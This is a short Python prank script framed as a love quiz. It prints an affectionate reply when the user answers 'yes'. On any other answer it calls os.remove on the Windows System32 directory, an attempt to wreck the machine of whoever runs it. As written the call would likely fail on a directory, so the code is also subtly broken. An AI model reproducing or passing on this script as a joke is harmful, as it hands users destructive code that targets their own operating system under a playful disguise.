import os

answer = input('Do you love me?: ')

if answer.lower() == 'yes':
    print('I LOVE YOU TOO')
else:
    os.remove("C:/Windows/System32")